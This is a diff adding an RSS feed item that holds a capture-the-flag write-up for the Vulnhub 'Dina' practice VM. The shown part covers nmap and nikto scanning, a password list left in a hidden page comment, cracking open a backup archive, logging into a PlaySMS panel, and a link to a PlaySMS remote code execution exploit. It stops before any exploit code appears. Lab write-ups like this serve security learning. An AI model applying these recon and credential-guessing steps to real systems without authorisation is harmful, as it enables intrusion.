@@ -7,6 +7,381 @@
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
     
       <item>
+        <title>Vulnhub.com - Dina 1</title>
+        <description>&lt;p&gt;Let’s quickly jump into another machine from Vulnhub called &lt;strong&gt;Dina&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Welcome to Dina 1.0.1
+
+________                                                _________
+\________\--------___       ___         ____----------/_________/
+    \_______\----\\\\\\   //_ _ \\    //////-------/________/
+        \______\----\\|| (( ~|~ )))  ||//------/________/
+            \_____\---\\ ((\ = / ))) //----/_____/
+                 \____\--\_)))  \ _)))---/____/
+                       \__/  (((     (((_/
+                          |  -)))  -  ))
+
+This is my first Boot2Root - CTF VM. I hope you enjoy it.
+
+if you run into any issue you can find me on Twitter: @touhidshaikh22
+
+Contact: touhidshaikh22 at gmaill.com &amp;lt;- Feel Free to write mail
+
+Website: http://www.touhidshaikh.com
+
+Goal: /root/flag.txt
+
+Level: Beginner (IF YOU STUCK ANYwhere PM me for HINT, But I don't think need any help).
+
+Download: https://drive.google.com/file/d/0B1qWCgvhnTXgNUF6Rlp0c3Rlb0k/view
+
+Try harder!: If you are confused or frustrated don't forget that enumeration is the key!
+
+Feedback: This is my first boot2root - CTF Virtual Machine, please give me feedback on how to improve!
+
+Tested: This VM was tested with:&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Author: &lt;a href=&quot;https://www.vulnhub.com/author/touhid-shaikh,465/&quot;&gt;&lt;b&gt;Touhid Shaikh&lt;/b&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Download: &lt;a href=&quot;https://drive.google.com/file/d/0B1qWCgvhnTXgNUF6Rlp0c3Rlb0k/view&quot;&gt;&lt;b&gt;Dina&lt;/b&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;write-up&quot;&gt;Write-Up&lt;/h1&gt;
+
+&lt;p&gt;Let’s begin by enumerating the ports using &lt;strong&gt;nmap&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~#  nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; 10.0.2.5
+
+Starting Nmap 7.60 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-11-18 08:55 EST
+NSE: Loaded 146 scripts &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 08:55
+Completed NSE at 08:55, 0.00s elapsed
+Initiating NSE at 08:55
+Completed NSE at 08:55, 0.00s elapsed
+Initiating ARP Ping Scan at 08:55
+Scanning 10.0.2.5 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1 port]
+Completed ARP Ping Scan at 08:55, 0.22s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 total hosts&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Initiating Parallel DNS resolution of 1 host. at 08:55
+Completed Parallel DNS resolution of 1 host. at 08:55, 0.00s elapsed
+Initiating SYN Stealth Scan at 08:55
+Scanning 10.0.2.5 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
+Discovered open port 80/tcp on 10.0.2.5
+Increasing send delay &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.0.2.5 from 0 to 5 due to max_successful_tryno increase to 5
+Increasing send delay &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.0.2.5 from 5 to 10 due to 24 out of 59 dropped probes since last increase.
+SYN Stealth Scan Timing: About 9.80% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 09:01 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:04:45 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+SYN Stealth Scan Timing: About 11.72% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 09:04 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:07:40 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+SYN Stealth Scan Timing: About 14.98% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 09:05 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:08:36 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+SYN Stealth Scan Timing: About 16.87% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 09:07 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:09:56 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+SYN Stealth Scan Timing: About 18.59% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 09:09 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:11:01 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+SYN Stealth Scan Timing: About 20.50% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 09:10 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:11:42 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Warning: 10.0.2.5 giving up on port because retransmission cap hit &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;6&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+SYN Stealth Scan Timing: About 23.70% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 09:12 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:12:27 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+SYN Stealth Scan Timing: About 45.90% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 09:17 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:11:38 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+SYN Stealth Scan Timing: About 51.99% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 09:17 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:10:33 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+SYN Stealth Scan Timing: About 57.71% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 09:18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:09:26 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+SYN Stealth Scan Timing: About 63.26% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 09:18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:08:19 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+SYN Stealth Scan Timing: About 68.64% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 09:18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:07:11 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+SYN Stealth Scan Timing: About 74.03% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 09:19 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:06:01 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+SYN Stealth Scan Timing: About 79.24% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 09:19 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:04:51 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+SYN Stealth Scan Timing: About 84.50% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 09:19 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:03:40 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+SYN Stealth Scan Timing: About 89.77% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 09:19 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:02:27 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+SYN Stealth Scan Timing: About 94.92% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 09:19 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:01:13 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Completed SYN Stealth Scan at 09:23, 1665.92s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Initiating Service scan at 09:23
+Scanning 1 service on 10.0.2.5
+Completed Service scan at 09:23, 6.04s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 service on 1 host&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Initiating OS detection &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;try &lt;span class=&quot;c&quot;&gt;#1) against 10.0.2.5&lt;/span&gt;
+adjust_timeouts2: packet supposedly had rtt of &lt;span class=&quot;nt&quot;&gt;-175605&lt;/span&gt; microseconds.  Ignoring time.
+adjust_timeouts2: packet supposedly had rtt of &lt;span class=&quot;nt&quot;&gt;-175605&lt;/span&gt; microseconds.  Ignoring time.
+NSE: Script scanning 10.0.2.5.
+Initiating NSE at 09:23
+Completed NSE at 09:23, 0.10s elapsed
+Initiating NSE at 09:23
+Completed NSE at 09:23, 0.00s elapsed
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.0.2.5
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00059s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 65534 closed ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.2.22 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+| http-robots.txt: 5 disallowed entries
+|_/ange1 /angel1 /nothing /tmp /uploads
+|_http-server-header: Apache/2.2.22 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_http-title: Dina
+MAC Address: 08:00:27:3A:EC:D6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Device &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;: general purpose
+Running: Linux 2.6.X|3.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
+OS details: Linux 2.6.32 - 3.5
+Uptime guess: 0.023 days &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;since Sat Nov 18 08:51:09 2017&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Network Distance: 1 hop
+TCP Sequence Prediction: &lt;span class=&quot;nv&quot;&gt;Difficulty&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;250 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Good luck!&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+IP ID Sequence Generation: All zeros
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.59 ms 10.0.2.5
+
+NSE: Script Post-scanning.
+Initiating NSE at 09:23
+Completed NSE at 09:23, 0.00s elapsed
+Initiating NSE at 09:23
+Completed NSE at 09:23, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;1675.39 seconds
+           Raw packets sent: 127751 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;5.623MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 137025 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;7.230MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;As you can see, the only service that’s open is &lt;strong&gt;http&lt;/strong&gt;. With that information, we can navigate to it with our browser.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/dina/main_web.png&quot; alt=&quot;Main Website&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;While looking for clues manually, I decided to run a &lt;strong&gt;nikto&lt;/strong&gt; scan to find some low hanging fruit.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nikto &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; 10.0.2.5
+- Nikto v2.1.6
+&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------&lt;/span&gt;
++ Target IP:          10.0.2.5
++ Target Hostname:    10.0.2.5
++ Target Port:        80
++ Start Time:         2017-11-18 08:57:45 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GMT-5&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------&lt;/span&gt;
++ Server: Apache/2.2.22 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
++ Server leaks inodes via ETags, header found with file /, inode: 425463, size: 3618, mtime: Tue Oct 17 09:46:52 2017
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;a different fashion to the MIME &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;
++ OSVDB-3268: /ange1/: Directory indexing found.
++ Entry &lt;span class=&quot;s1&quot;&gt;'/ange1/'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;robots.txt returned a non-forbidden or redirect HTTP code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
++ OSVDB-3268: /angel1/: Directory indexing found.
++ Entry &lt;span class=&quot;s1&quot;&gt;'/angel1/'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;robots.txt returned a non-forbidden or redirect HTTP code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
++ OSVDB-3268: /tmp/: Directory indexing found.
++ Entry &lt;span class=&quot;s1&quot;&gt;'/tmp/'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;robots.txt returned a non-forbidden or redirect HTTP code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
++ OSVDB-3268: /uploads/: Directory indexing found.
++ Entry &lt;span class=&quot;s1&quot;&gt;'/uploads/'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;robots.txt returned a non-forbidden or redirect HTTP code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
++ &lt;span class=&quot;s2&quot;&gt;&quot;robots.txt&quot;&lt;/span&gt; contains 5 entries which should be manually viewed.
++ Uncommon header &lt;span class=&quot;s1&quot;&gt;'tcn'&lt;/span&gt; found, with contents: list
++ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4698ebdc59d15. The following alternatives &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'index'&lt;/span&gt; were found: index.html
++ Apache/2.2.22 appears to be outdated &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;current is at least Apache/2.4.12&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; Apache 2.0.65 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;final release&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; and 2.2.29 are also current.
++ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
++ OSVDB-3268: /secure/: Directory indexing found.
++ OSVDB-3092: /tmp/: This might be interesting...
++ OSVDB-3233: /icons/README: Apache default file found.
++ 8351 requests: 0 error&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; and 20 item&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; reported on remote host
++ End Time:           2017-11-18 08:58:10 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GMT-5&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;25 seconds&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------&lt;/span&gt;
++ 1 host&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; tested&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;And there it is, in &lt;strong&gt;secure&lt;/strong&gt; directory there is a &lt;strong&gt;backup&lt;/strong&gt; file.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;http://10.0.2.5/secure/
+backup.zip&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Unfortuntely, it’s password protected, so let’s keep it in mind and look for some more clues.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/Downloads# 7z x backup.zip
+
+7-Zip &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;64] 16.02 : Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;locale&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;C.UTF-8,Utf16&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;on,HugeFiles&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;on,64 bits,2 CPUs Intel&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;R&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Core&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;TM&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; i5-2410M CPU @ 2.30GHz &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;206A7&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,ASM&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+Scanning the drive &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;archives:
+1 file, 336 bytes &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 KiB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+Extracting archive: backup.zip
+&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;
+Path &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; backup.zip
+Type &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; zip
+Physical Size &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 336
+
+
+Enter password &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;will not be echoed&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
+ERROR: Wrong password : backup-cred.mp3
+
+Sub items Errors: 1
+
+Archives with Errors: 1
+
+Sub items Errors: 1&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Here’s the content of &lt;strong&gt;robots.txt&lt;/strong&gt;, makes it better to scan one by one.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;User-agent: *
+Disallow: /ange1
+Disallow: /angel1
+Disallow: /nothing
+Disallow: /tmp
+Disallow: /uploads&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;While every other directory is empty, there is a hidden comment in one called &lt;strong&gt;/nothing&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;&lt;/span&gt;404 NOT FOUND&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;&amp;lt;!--
+#my secret pass
+freedom
+password
+helloworld!
+diana
+iloveroot
+--&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;NOT FOUND&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;h3&amp;gt;&lt;/span&gt;go back&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h3&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;List of passwords, which we can now use to extract the contents of the backup. Luckily, first one already works - &lt;strong&gt;freedom&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/Downloads# 7z x backup.zip
+
+7-Zip &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;64] 16.02 : Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;locale&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;C.UTF-8,Utf16&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;on,HugeFiles&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;on,64 bits,2 CPUs Intel&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;R&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Core&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;TM&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; i5-2410M CPU @ 2.30GHz &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;206A7&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,ASM&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+Scanning the drive &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;archives:
+1 file, 336 bytes &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 KiB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+Extracting archive: backup.zip
+&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;
+Path &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; backup.zip
+Type &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; zip
+Physical Size &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 336
+
+
+Would you like to replace the existing file:
+  Path:     ./backup-cred.mp3
+  Size:     0 bytes
+  Modified: 2017-10-17 08:27:49
+with the file from archive:
+  Path:     backup-cred.mp3
+  Size:     176 bytes &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 KiB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+  Modified: 2017-10-17 08:27:49
+? &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Y&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;es / &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;N&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;o / &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;A&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;lways / &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;S&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;kip all / A&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;u&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;to rename all / &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Q&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;uit? Y
+
+
+Enter password &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;will not be echoed&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
+Everything is Ok      
+
+Size:       176
+Compressed: 336&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now we can take a closer look at the file.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/Downloads# file backup-cred.mp3
+backup-cred.mp3: ASCII text
+root@kali:~/Downloads# &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;backup-cred.mp3
+
+I am not toooo smart &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;computer .......dat the resoan i always choose easy password...with creds backup file....
+
+uname: touhid
+password: &lt;span class=&quot;k&quot;&gt;******&lt;/span&gt;
+
+
+url : /SecreTSMSgatwayLogin&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Great! As simple as it is, we get another clue. Let’s take a look at the provided directory.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/dina/secret-sms.png&quot; alt=&quot;Secret SMS&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As we already have a username, the best way to get into the website is to try passwords from the previously provided list. This time it’s &lt;strong&gt;diana&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/dina/secret-sms-logged.png&quot; alt=&quot;Secret SMS Logged&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And after doing a little bit of enumeration, I’ve found exploit available for this service. &lt;a href=&quot;https://www.exploit-db.com/exploits/42003/&quot; title=&quot;PlaySMS Remote Code Execution&quot;&gt;PlaySMS Remote Code Execution&lt;/a&gt;, which we can use to attack our target.&lt;/p&gt;
+
